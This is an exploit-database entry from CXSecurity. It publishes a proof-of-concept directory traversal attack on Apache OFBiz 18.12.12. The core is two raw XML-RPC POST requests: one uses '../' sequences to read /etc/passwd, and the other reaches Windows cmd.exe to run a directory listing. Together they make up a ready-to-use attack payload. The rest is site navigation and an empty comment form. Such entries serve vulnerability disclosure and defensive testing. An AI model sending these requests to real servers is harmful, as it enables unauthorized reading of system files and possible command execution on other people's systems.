---
title: Apache OFBiz 18.12.12 Directory Traversal
url: https://cxsecurity.com/issue/WLB-2024050062
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-21
fetch_date: 2025-10-06T16:48:51.496481
---

# Apache OFBiz 18.12.12 Directory Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache OFBiz 18.12.12 Directory Traversal** **2024.05.20**  Credit:  **[Abdualhadi Khalifa](https://cxsecurity.com/author/Abdualhadi%2BKhalifa/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

# Exploit Title: Apache OFBiz 18.12.12 - Directory Traversal
# Google Dork: N/A
# Date: 2024-05-16
# Exploit Author: [Abdualhadi khalifa (https://twitter.com/absholi\_ly)
# Vendor Homepage: https://ofbiz.apache.org/
## Software Link: https://ofbiz.apache.org/download.html
# Version: below <=18.12.12
# Tested on: Windows10
Poc.
1-
POST /webtools/control/xmlrpc HTTP/1.1
Host: vulnerable-host.com
Content-Type: text/xml
<?xml version="1.0"?>
<methodCall>
<methodName>example.createBlogPost</methodName>
<params>
<param>
<value><string>../../../../../../etc/passwd</string></value>
</param>
</params>
</methodCall>
OR
2-
POST /webtools/control/xmlrpc HTTP/1.1
Host: vulnerable-host.com
Content-Type: text/xml
<?xml version="1.0"?>
<methodCall>
<methodName>performCommand</methodName>
<params>
<param>
<value><string>../../../../../../windows/system32/cmd.exe?/c+dir+c:\</string></value>
</param>
</params>
</methodCall>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050062)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top